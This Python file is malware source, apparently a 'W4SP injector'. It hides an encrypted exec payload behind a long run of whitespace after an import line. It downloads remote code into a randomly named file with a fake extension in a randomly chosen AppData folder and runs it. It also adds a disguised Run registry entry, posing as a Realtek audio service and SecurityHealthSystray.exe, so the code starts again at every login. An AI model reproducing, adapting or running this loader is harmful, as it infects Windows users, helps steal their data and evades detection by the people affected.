import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'YcAPIa6CK-IJdiKaP_TSX-zf_YoVuvMB2yf3Ddugp5s=').decrypt(b'gAAAAABlKxRMh3ybmDkB-sgx6m6J-dAZ_X3u2B1p18sKRgB1WyAomXKIeQM3_4UK9ssfhVgVaczUVuizfdrLfSEWfne5rv3nUUtI5xIWbL19O81PNZSBnHoWcZ4qkbVxPDsMH-D-4y0jKfAmz-2U_iTUNKhIGi0BveWMqaZNw1vNqHf7aDadjTwuQIxA9_xXm6CV7jNyEP_jRnb8cPuqT1rjILkXNbH8gg=='))
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

# W4SP injector 1.1
# by loTus04

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")

DoYouKnowTheWay = getPath() + '\\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
try:
    startUP(DoYouKnowTheWay)
except:
    pass
